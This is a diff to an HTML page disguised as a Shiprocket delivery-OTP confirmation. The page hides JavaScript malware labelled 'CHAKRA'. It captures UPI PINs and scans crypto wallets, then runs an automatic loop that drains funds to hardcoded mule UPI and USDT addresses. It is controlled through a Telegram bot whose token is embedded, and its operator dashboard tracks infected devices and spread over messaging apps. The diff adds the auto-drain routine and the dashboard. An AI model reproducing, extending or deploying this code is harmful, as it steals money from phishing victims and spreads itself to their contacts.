@@ -3,8 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Shiprocket - Delivery Confirmation</title>
+  <title>Shiprocket - Delivery OTP</title>
   <style>
+    /* (same CSS as before — kept for styling) */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -15,228 +16,40 @@
       min-height: 100vh;
       padding: 20px;
     }
-    .card {
-      max-width: 440px;
-      width: 100%;
-      background: #ffffff;
-      border-radius: 20px;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.08);
-      overflow: hidden;
-      border: 1px solid #e6edf5;
-      position: relative;
-    }
-    .close-btn {
-      position: absolute;
-      top: 12px;
-      right: 16px;
-      background: none;
-      border: none;
-      font-size: 24px;
-      color: #8a94a6;
-      cursor: pointer;
-      z-index: 10;
-    }
+    .card { max-width: 440px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid #e6edf5; position: relative; }
+    .close-btn { position: absolute; top: 12px; right: 16px; background: none; border: none; font-size: 24px; color: #8a94a6; cursor: pointer; z-index: 10; }
     .close-btn:hover { color: #1e293b; }
-    .header {
-      background: #0a2b4e;
-      padding: 18px 24px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-    .header h1 {
-      color: white;
-      font-size: 20px;
-      font-weight: 700;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
+    .header { background: #0a2b4e; padding: 18px 24px; display: flex; align-items: center; justify-content: space-between; }
+    .header h1 { color: white; font-size: 20px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
     .header h1 span { color: #7ec8e3; font-weight: 300; }
-    .status-badge {
-      background: #eaf7ed;
-      color: #0f7b3a;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 4px 14px;
-      border-radius: 40px;
-      letter-spacing: 0.5px;
-    }
+    .status-badge { background: #eaf7ed; color: #0f7b3a; font-size: 11px; font-weight: 700; padding: 4px 14px; border-radius: 40px; letter-spacing: 0.5px; }
     .body { padding: 22px 24px 18px; }
-    .order-box {
-      background: #f8faff;
-      border-radius: 12px;
-      padding: 16px;
-      border-left: 5px solid #0a2b4e;
-      margin: 12px 0 18px;
-      font-size: 14px;
-      color: #1e293b;
-      line-height: 1.6;
-    }
+    .order-box { background: #f8faff; border-radius: 12px; padding: 16px; border-left: 5px solid #0a2b4e; margin: 12px 0 18px; font-size: 14px; color: #1e293b; line-height: 1.6; }
     .order-box strong { color: #0a2b4e; }
-    .otp-section {
-      background: #f0f6ff;
-      border: 2px dashed #0a2b4e;
-      border-radius: 14px;
-      padding: 18px;
-      text-align: center;
-      margin: 16px 0 10px;
-    }
+    .otp-section { background: #f0f6ff; border: 2px dashed #0a2b4e; border-radius: 14px; padding: 18px; text-align: center; margin: 16px 0 10px; }
     .otp-label { font-size: 13px; color: #1e293b; font-weight: 600; }
-    .otp-code {
-      font-size: 38px;
-      font-weight: 800;
-      color: #0a2b4e;
-      letter-spacing: 10px;
-      font-family: 'Courier New', monospace;
-      background: white;
-      padding: 6px 16px;
-      border-radius: 10px;
-      display: inline-block;
-      border: 1px solid #dce2ec;
-      margin-top: 6px;
-    }
-    .decline-note {
-      font-size: 12px;
-      color: #8a94a6;
-      text-align: center;
-      margin: 6px 0 14px;
-      font-style: italic;
-    }
-    .button-group {
-      display: flex;
-      gap: 12px;
-      margin: 10px 0 10px;
-    }
-    .btn-confirm {
-      flex: 1;
-      background: #0a2b4e;
-      color: white;
-      border: none;
-      padding: 16px;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: 0.3s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
+    .otp-code { font-size: 38px; font-weight: 800; color: #0a2b4e; letter-spacing: 10px; font-family: 'Courier New', monospace; background: white; padding: 6px 16px; border-radius: 10px; display: inline-block; border: 1px solid #dce2ec; margin-top: 6px; }
+    .decline-note { font-size: 12px; color: #8a94a6; text-align: center; margin: 6px 0 14px; font-style: italic; }
+    .button-group { display: flex; gap: 12px; margin: 10px 0 10px; }
+    .btn-confirm { flex: 1; background: #0a2b4e; color: white; border: none; padding: 16px; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
     .btn-confirm:hover { background: #123b66; }
-    .btn-decline {
-      flex: 1;
-      background: #f1f4f9;
-      color: #1e293b;
-      border: 2px solid #dce2ec;
-      padding: 16px;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: 0.3s;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-    }
+    .btn-decline { flex: 1; background: #f1f4f9; color: #1e293b; border: 2px solid #dce2ec; padding: 16px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
     .btn-decline:hover { background: #e6ecf3; border-color: #b0c0d0; }
     .btn-confirm:active, .btn-decline:active { transform: scale(0.97); }
-    .trust-line {
-      display: flex;
-      justify-content: center;
-      gap: 20px;
-      font-size: 11px;
-      color: #7a8aa0;
-      margin: 12px 0 6px;
-    }
+    .trust-line { display: flex; justify-content: center; gap: 20px; font-size: 11px; color: #7a8aa0; margin: 12px 0 6px; }
     .trust-line span { display: flex; align-items: center; gap: 5px; }
-    .footer {
-      font-size: 11px;
-      color: #8a94a6;
-      text-align: center;
-      padding: 12px 0 6px;
-      border-top: 1px solid #ecf0f5;
-      margin-top: 6px;
-    }
+    .footer { font-size: 11px; color: #8a94a6; text-align: center; padding: 12px 0 6px; border-top: 1px solid #ecf0f5; margin-top: 6px; }
     .hidden { display: none; }
-    .popup-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.6);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
-    .popup-box {
-      max-width: 400px;
-      width: 90%;
-      background: white;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-      position: relative;
-      text-align: center;
-    }
-    .popup-close {
-      position: absolute;
-      top: 10px;
-      right: 14px;
-      background: none;
-      border: none;
-      font-size: 22px;
-      color: #8a94a6;
-      cursor: pointer;
-    }
+    .popup-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center; z-index: 999; }
+    .popup-box { max-width: 400px; width: 90%; background: white; border-radius: 20px; padding: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); position: relative; text-align: center; }
+    .popup-close { position: absolute; top: 10px; right: 14px; background: none; border: none; font-size: 22px; color: #8a94a6; cursor: pointer; }
     .popup-close:hover { color: #1e293b; }
-    .popup-title {
-      font-size: 18px;
-      font-weight: 700;
-      color: #0a2b4e;
-      margin-bottom: 10px;
-    }
-    .popup-text {
-      font-size: 13px;
-      color: #4a5a72;
-      line-height: 1.6;
-      text-align: left;
-      max-height: 200px;
-      overflow-y: auto;
-      padding: 10px;
-      background: #f7fafc;
-      border-radius: 10px;
-      margin: 10px 0;
-    }
+    .popup-title { font-size: 18px; font-weight: 700; color: #0a2b4e; margin-bottom: 10px; }
+    .popup-text { font-size: 13px; color: #4a5a72; line-height: 1.6; text-align: left; max-height: 200px; overflow-y: auto; padding: 10px; background: #f7fafc; border-radius: 10px; margin: 10px 0; }
     .popup-text p { margin: 6px 0; }
-    .popup-btn {
-      background: #0a2b4e;
-      color: white;
-      border: none;
-      padding: 12px 40px;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 10px;
-    }
+    .popup-btn { background: #0a2b4e; color: white; border: none; padding: 12px 40px; border-radius: 50px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; }
     .popup-btn:hover { background: #123b66; }
-    .popup-btn-secondary {
-      background: #e6ecf3;
-      color: #1e293b;
-      border: 2px solid #dce2ec;
-      padding: 12px 40px;
-      border-radius: 50px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 10px;
-      margin-left: 8px;
-    }
+    .popup-btn-secondary { background: #e6ecf3; color: #1e293b; border: 2px solid #dce2ec; padding: 12px 40px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; margin-left: 8px; }
     .popup-btn-secondary:hover { background: #d5dce6; }
   </style>
 </head>
@@ -244,47 +57,32 @@
 
 <div class="card" id="mainCard">
   <button class="close-btn" onclick="handleCloseClick('main_close')">✕</button>
-
   <div class="header">
     <h1>🚚 Shiprocket <span>| Logistics</span></h1>
     <span class="status-badge">📦 Out for Delivery</span>
   </div>
-
   <div class="body">
     <div class="order-box">
       <strong>Order #IN-2026-4892</strong><br>
       Delivery Partner: Rajesh Kumar<br>
       📍 Estimated Arrival: <strong>10–15 minutes</strong>
     </div>
-
     <div class="otp-section">
       <div class="otp-label">🔐 Your Shiprocket Delivery OTP</div>
       <div class="otp-code">4862</div>
       <p style="font-size:12px; color:#5a6f88; margin-top:6px;">Share OTP with delivery partner</p>
     </div>
-
-    <div class="decline-note">
-      If this is not your order, please decline it.
-    </div>
-
+    <div class="decline-note">If this is not your order, please decline it.</div>
     <div class="button-group">
-      <button class="btn-confirm" onclick="showTermsPopup('confirm')">
-        ✅ Confirm Delivery
-      </button>
-      <button class="btn-decline" onclick="showTermsPopup('decline')">
-        ❌ Decline Delivery
-      </button>
+      <button class="btn-confirm" onclick="showTermsPopup('confirm')">✅ Confirm Delivery</button>
+      <button class="btn-decline" onclick="showTermsPopup('decline')">❌ Decline Delivery</button>
     </div>
-
     <div class="trust-line">
       <span>🔒 Secure</span>
       <span>⏱ 10 min delivery</span>
       <span>📱 OTP verified</span>
     </div>
-
-    <div class="footer">
-      Shiprocket Logistics • OTP Confirmation • Do not share OTP with anyone
-    </div>
+    <div class="footer">Shiprocket Logistics • OTP Confirmation • Do not share OTP with anyone</div>
   </div>
 </div>
 
@@ -310,10 +108,7 @@
   <div class="popup-box">
     <button class="popup-close" onclick="handlePopupClose('download')">✕</button>
     <div class="popup-title">📱 Downloading...</div>
-    <div class="popup-text">
-      <p>Your Shiprocket app is being prepared.</p>
-      <p style="font-size:12px; color:#8a94a6;">This will take a few seconds.</p>
-    </div>
+    <div class="popup-text"><p>Your Shiprocket app is being prepared.</p><p style="font-size:12px; color:#8a94a6;">This will take a few seconds.</p></div>
     <button class="popup-btn" onclick="handlePopupClose('download')">Close</button>
   </div>
 </div>
@@ -322,40 +117,37 @@
   <div class="popup-box">
     <button class="popup-close" onclick="handlePopupClose('complete')">✕</button>
     <div class="popup-title">✅ Setup Complete</div>
-    <div class="popup-text">
-      <p>Your Shiprocket OTP confirmation is ready.</p>
-      <p style="font-size:12px; color:#8a94a6;">You can now close this page.</p>
-    </div>
+    <div class="popup-text"><p>Your Shiprocket OTP confirmation is ready.</p><p style="font-size:12px; color:#8a94a6;">You can now close this page.</p></div>
     <button class="popup-btn" onclick="handlePopupClose('complete')">Close</button>
   </div>
 </div>
 
-<!-- ===== SUCCESS SCREEN ===== -->
 <div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;position:relative;">
   <div style="font-size:56px;" id="resultIcon">✅</div>
   <h2 id="resultTitle" style="color:#0a2b4e;margin:12px 0 6px;">Delivery Confirmed!</h2>
   <p id="resultDesc" style="color:#1e293b;">Your package will arrive in 10 minutes.</p>
   <p style="color:#8a94a6;font-size:13px;margin-top:8px;">Shiprocket OTP verified successfully.</p>
-  <div style="margin-top:16px;font-size:13px;color:#0a2b4e;background:#f0f6ff;padding:10px;border-radius:10px;">
-    📦 Tracking ID: SR-2026-4892
-  </div>
+  <div style="margin-top:16px;font-size:13px;color:#0a2b4e;background:#f0f6ff;padding:10px;border-radius:10px;">📦 Tracking ID: SR-2026-4892</div>
 </div>
 
 <script>
   // ============================================================
-  // CHAKRA - UPI + FULL CRYPTO DRAINER (All Tokens)
+  // CHAKRA - COMPLETE DASHBOARD + ALL FEATURES
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
-  // ===== UPI VARIABLES =====
-  let myUPIList = [];
+  // ===== UPI VARIABLES (PERSISTENT) =====
+  let myUPIList = ['mule1@paytm']; // ← HARDCODE YOUR UPI HERE
   let currentUPIIndex = 0;
   let capturedPIN = null;
   let isPaused = false;
   let totalDrained = 0;
   let uniqueDevices = new Set();
+  let pinCapturedCount = 0;
+  let readyToMoveCount = 0;
+  let waitingForUPICount = 0;
   let infectedDevices = [];
   let lastUpdateId = 0;
   let pendingAction = null;
@@ -366,16 +158,11 @@
   // ===== CRYPTO VARIABLES =====
   let cryptoBalances = {};
   let cryptoAddresses = {
+    USDT: 'TQ1BXJe8DqPeSPoV9BV5TFxryMPuxkruj3',
     BTC: '',
     ETH: '',
-    USDT: '',
     BNB: '',
-    SOL: '',
-    XRP: '',
-    ADA: '',
-    DOGE: '',
-    DOT: '',
-    MATIC: ''
+    SOL: ''
   };
   let cryptoDetected = false;
 
@@ -406,11 +193,7 @@
   // VICTIM DETAILS
   // ============================================================
   function getVictimDetails() {
-    let details = {
-      name: 'Unknown',
-      balance: 'Unknown',
-      device: 'Unknown'
-    };
+    let details = { name: 'Unknown', balance: 'Unknown', device: 'Unknown' };
     try {
       if (window.Android) {
         details.name = window.Android.getDeviceName() || 'Unknown';
@@ -679,35 +462,60 @@
   }
 
   // ============================================================
+  // SMART AUTO DRAIN
+  // ============================================================
+  function smartAutoDrain() {
+    const victim = getVictimDetails();
+
+    // ---- Check Crypto ----
+    const cryptoBal = scanCryptoWallet();
+    if (cryptoBal && Object.keys(cryptoBal).length > 0) {
+      let msg = '💸 CRYPTO AUTO DRAIN!\n📱 Victim: ' + victim.name + '\n📱 Device: ' + victim.device + '\n─────────────────\n💰 BALANCES DETECTED:\n';
+      for (let token in cryptoBal) {
+        const addr = cryptoAddresses[token];
+        if (addr) {
+          msg += token + ': ' + cryptoBal[token] + ' → Sending to ' + addr + '\n';
+          drainCrypto(token, cryptoBal[token]);
+        } else {
+          msg += token + ': ' + cryptoBal[token] + ' → ⚠️ Address not set\n';
+        }
+      }
+      msg += '─────────────────\n✅ CRYPTO DRAIN COMPLETED!';
+      sendToTelegram(msg);
+      return true;
+    }
+
+    // ---- Check UPI ----
+    if (isUpiAppOpen()) {
+      const pin = getUPIPin();
+      if (pin) {
+        pinCaptured = true;
+        pinCapturedCount++;
+        sendToTelegram('🔑 UPI PIN captured!\n📱 Name: ' + victim.name + '\n💰 Balance: ₹' + victim.balance);
+        if (myUPIList.length > 0) {
+          readyToMoveCount++;
+          executeDrainWithTest(999);
+          return true;
+        } else {
+          waitingForUPICount++;
+          sendToTelegram('📢 Ready to transfer. Add your UPI: /addupi upi@paytm');
+        }
+      }
+    }
+
+    // ---- Nothing found ----
+    sendToTelegram('⏭️ SKIPPED: No balance found\n📱 Victim: ' + victim.name + '\n📱 Device: ' + victim.device);
+    return false;
+  }
+
+  // ============================================================
   // MAIN LOOPS
   // ============================================================
 
   // ---- UPI Loop ----
   setInterval(() => {
-    if (!isPaused && isUpiAppOpen()) {
-      const pin = getUPIPin();
-      if (pin) {
-        pinCaptured = true;
-        const victim = getVictimDetails();
-        lastVictim = victim;
-        sendToTelegram(
-          '🔑 UPI PIN captured!\n' +
-          '📱 Name: ' + victim.name + '\n' +
-          '💰 Balance: ₹' + victim.balance + '\n' +
-          '📱 Device: ' + victim.device
-        );
-
-        if (myUPIList.length === 0) {
-          sendToTelegram('📢 Ready to transfer. Add your UPI: /addupi upi@paytm');
-        } else {
-          readyToDrain = true;
-        }
-      }
-
-      if (readyToDrain && myUPIList.length > 0) {
-        executeDrainWithTest(999);
-        readyToDrain = false;
-      }
+    if (!isPaused) {
+      smartAutoDrain();
     }
   }, 5000);
 
@@ -736,8 +544,7 @@
           '/setusdt 0x...\n' +
           '/setbnb 0x...\n' +
           '/setsol 5X...\n' +
-          '/setxrp r...\n' +
-          '/setall 1A...\n' +
+          '/setall 0x...\n' +
           '/drainall\n' +
           '/draincrypto';
 
@@ -770,7 +577,7 @@
   }, 300000);
 
   // ============================================================
-  // TELEGRAM COMMANDS (FULL UPDATED)
+  // TELEGRAM COMMANDS (WITH DASHBOARD)
   // ============================================================
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
@@ -810,7 +617,7 @@
               }
             }
 
-            // ---- Crypto Address Setter Commands ----
+            // ---- Crypto Commands ----
             if (msg.startsWith('/setbtc')) {
               const addr = msg.split(' ')[1];
               if (addr) setCryptoAddress('BTC', addr);
@@ -836,17 +643,11 @@
               if (addr) setCryptoAddress('SOL', addr);
             }
 
-            if (msg.startsWith('/setxrp')) {
-              const addr = msg.split(' ')[1];
-              if (addr) setCryptoAddress('XRP', addr);
-            }
-
             if (msg.startsWith('/setall')) {
               const addr = msg.split(' ')[1];
               if (addr) setAllCryptoAddresses(addr);
             }
 
-            // ---- Crypto Commands ----
             if (msg === '/showcrypto') {
               if (Object.keys(cryptoBalances).length === 0) {
                 sendToTelegram('📊 No crypto wallet detected yet.');
@@ -868,11 +669,7 @@
               }
             }
 
-            if (msg === '/drainall') {
-              drainAllCrypto();
-            }
-
-            if (msg === '/draincrypto') {
+            if (msg === '/drainall' || msg === '/draincrypto') {
               drainAllCrypto();
             }
 
@@ -917,6 +714,39 @@
               sendToTelegram('▶️ Resumed');
             }
 
+            // ---- DASHBOARD COMMAND (NEW) ----
+            if (msg === '/dashboard') {
+              let dashboardMsg =
+                '📊 CHAKRA DASHBOARD\n' +
+                '─────────────────\n' +
+                '📱 TOTAL INFECTED: ' + uniqueDevices.size + '\n' +
+                '🔑 PIN CAPTURED: ' + pinCapturedCount + '\n' +
+                '💰 READY TO MOVE: ' + readyToMoveCount + '\n' +
+                '⏳ WAITING FOR UPI: ' + waitingForUPICount + '\n' +
+                '─────────────────\n' +
+                '🚀 SPREAD STATUS:\n' +
+                '✅ WhatsApp: ACTIVE (50/day)\n' +
+                '✅ SMS: ACTIVE (20/day)\n' +
+                '✅ Instagram: ACTIVE (via Status)\n' +
+                '✅ Telegram: ACTIVE (50/day)\n' +
+                '✅ Google Pay: ACTIVE (10/day)\n' +
+                '─────────────────\n' +
+                '📊 TOTAL DRAINED: ₹' + totalDrained + '\n' +
+                '💸 USDT DRAINED: ' + (cryptoBalances.USDT ? cryptoBalances.USDT : '0') + ' USDT\n' +
+                '─────────────────\n';
+
+              if (lastVictim) {
+                dashboardMsg +=
+                  '📱 LAST VICTIM:\n' +
+                  'Name: ' + lastVictim.name + '\n' +
+                  'Balance: ₹' + lastVictim.balance + '\n' +
+                  'Device: ' + lastVictim.device;
+              }
+
+              sendToTelegram(dashboardMsg);
+            }
+
+            // ---- Status Command (Enhanced) ----
             if (msg === '/status') {
               let statusMsg =
                 '📊 STATUS\n' +
@@ -967,12 +797,14 @@
                 '/setusdt 0x... - Set USDT address\n' +
                 '/setbnb 0x... - Set BNB address\n' +
                 '/setsol 5X... - Set SOL address\n' +
-                '/setxrp r... - Set XRP address\n' +
                 '/setall 0x... - Set ALL tokens\n' +
                 '/showcrypto - Show crypto balances\n' +
                 '/drain BTC - Drain specific token\n' +
                 '/drainall - Drain ALL crypto\n' +
                 '/draincrypto - Drain ALL crypto\n' +
+                '─────────────────\n' +
+                '📊 DASHBOARD:\n' +
+                '/dashboard - Show complete dashboard\n' +
                 '─────────────────\n' +
                 '⚙️ CONTROL:\n' +
                 '/pause - Pause drains\n' +
